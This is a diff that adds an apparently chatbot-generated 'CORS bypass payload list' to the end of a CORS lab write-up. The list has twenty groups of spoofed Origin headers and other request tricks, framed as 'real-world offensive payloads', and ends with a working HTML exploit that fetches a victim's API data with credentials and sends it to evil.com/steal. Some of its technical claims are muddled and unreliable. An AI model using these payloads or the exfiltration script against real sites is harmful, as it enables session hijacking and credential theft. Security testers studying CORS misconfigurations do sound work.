@@ -676,3 +676,305 @@ And decode the API key:
 
 
 ![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/10.png)
+
+Below is the **complete CORS Bypass Payload List**, written in the **same clean format** as your previous request:
+
+# ⭐ **CORS – Complete Bypass Payload List (for CORS Misconfiguration Testing)**
+
+This list contains **real-world offensive payloads** used to detect and exploit insecure CORS configurations.
+
+---
+
+# **1. Basic Origin Spoofing Payloads**
+
+```
+Origin: https://evil.com
+Origin: http://attacker.com
+Origin: null
+```
+
+---
+
+# **2. Subdomain Spoofing**
+
+```
+Origin: https://evil.victim.com
+Origin: https://victim.com.evil.com
+Origin: https://admin.victim.com.evil.com
+```
+
+---
+
+# **3. Protocol Variation Bypass**
+
+```
+Origin: http://victim.com
+Origin: https://victim.com
+Origin: ftp://victim.com
+Origin: chrome-extension://abcd/
+```
+
+---
+
+# **4. “null” Origin Bypass** (often allowed accidentally)
+
+Used for sandboxed iframes / file:// / data://:
+
+```
+Origin: null
+```
+
+This bypasses `Access-Control-Allow-Origin: *` restrictions in many misconfigured setups.
+
+---
+
+# **5. Wildcard Bypass Payloads**
+
+Try when you suspect:
+
+```
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true   <-- DANGER
+```
+
+Payload:
+
+```
+Origin: https://evil.com
+```
+
+If server incorrectly responds with:
+
+```
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
+
+→ **Full account takeover possible**.
+
+---
+
+# **6. Port Manipulation Payloads**
+
+```
+Origin: https://victim.com:80
+Origin: https://victim.com:443
+Origin: https://victim.com:3000
+Origin: https://victim.com:8080
+Origin: https://evil.com:1337
+```
+
+---
+
+# **7. Encoding / Obfuscation Origin Payloads**
+
+**URL Encoded:**
+
+```
+Origin: https://evil%2ecom
+Origin: https://victim%2ecom%2eevil.com
+```
+
+**Double-encoded:**
+
+```
+Origin: https://evil%252ecom
+```
+
+---
+
+# **8. IP Literal / Decimal / Octal Bypass**
+
+IPv4:
+
+```
+Origin: http://127.0.0.1
+Origin: http://2130706433   (decimal for 127.0.0.1)
+Origin: http://0177.0.0.1   (octal)
+```
+
+IPv6:
+
+```
+Origin: http://[::1]
+```
+
+---
+
+# **9. Mixed-Case Origin Header Bypass**
+
+```
+Origin: hTTp://evil.com
+Origin: HtTpS://EvIl.CoM
+```
+
+Some regex matchers fail on case variations.
+
+---
+
+# **10. Exploiting *.victim.com CORS Wildcard**
+
+If the app allows:
+
+```
+Access-Control-Allow-Origin: *.victim.com
+```
+
+Payload:
+
+```
+Origin: https://evil.victim.com
+```
+
+---
+
+# **11. JSONP + CORS Combined Bypass**
+
+```
+Origin: https://evil.com
+GET /api?callback=steal
+```
+
+This allows leaking sensitive JSON without preflight.
+
+---
+
+# **12. CORS Misconfigured Response Header Abuse**
+
+Test manipulation:
+
+```
+Origin: http://evil.com
+Access-Control-Request-Method: GET
+Access-Control-Request-Headers: Authorization, X-Api-Key
+```
+
+Server responds with:
+
+```
+Access-Control-Allow-Headers: Authorization, X-Api-Key
+```
+
+→ You can steal credentials.
+
+---
+
+# **13. Preflight Bypass Payloads**
+
+**Request:**
+
+```
+OPTIONS /api HTTP/1.1
+Origin: https://evil.com
+Access-Control-Request-Method: GET
+Access-Control-Request-Headers: Authorization
+```
+
+If server replies with:
+
+```
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Headers: Authorization
+```
+
+→ **credential theft possible**.
+
+---
+
+# **14. Bypass Using Malformed Origins**
+
+```
+Origin: https://evil..com
+Origin: https://.evil.com
+Origin: https://evil/.com
+Origin: file://
+Origin: data:text/html;base64,xxxxx
+```
+
+Some servers normalize incorrectly.
+
+---
+
+# **15. @ Trick Origin Injection**
+
+```
+Origin: https://victim.com@evil.com
+Origin: https://evil.com@victim.com
+```
+
+Some parsers interpret before or after "@".
+
+---
+
+# **16. Double-Scheme Injection**
+
+```
+Origin: https://https://evil.com
+Origin: https:http://evil.com
+```
+
+---
+
+# **17. Using non-ASCII / Unicode**
+
+```
+Origin: https://ｅｖｉｌ.com
+Origin: https://victim․com    (dot replaced with U+2024)
+```
+
+Unicode bypasses naive domain validation.
+
+---
+
+# **18. Allowed-Origin Reflection Bypass**
+
+If server reflects origin blindly:
+
+**Send:**
+
+```
+Origin: https://my.evil.com
+```
+
+**Server responds:**
+
+```
+Access-Control-Allow-Origin: https://my.evil.com
+Access-Control-Allow-Credentials: true
+```
+
+→ **Complete session hijack**.
+
+---
+
+# **19. Exploiting Misconfigured Allowed-Headers**
+
+```
+Access-Control-Request-Headers: Authorization
+Access-Control-Request-Headers: X-Api-Key
+Access-Control-Request-Headers: X-Requested-With
+```
+
+If server whitelists them:
+→ You can read sensitive API responses.
+
+---
+
+# **20. Advanced Payload: Full Exploit HTML (Real Attack)**
+
+```html
+<script>
+fetch("https://victim.com/api/user", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(d => fetch("https://evil.com/steal?data=" + btoa(d)));
+</script>
+```
+
+If server responds with:
+
+```
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
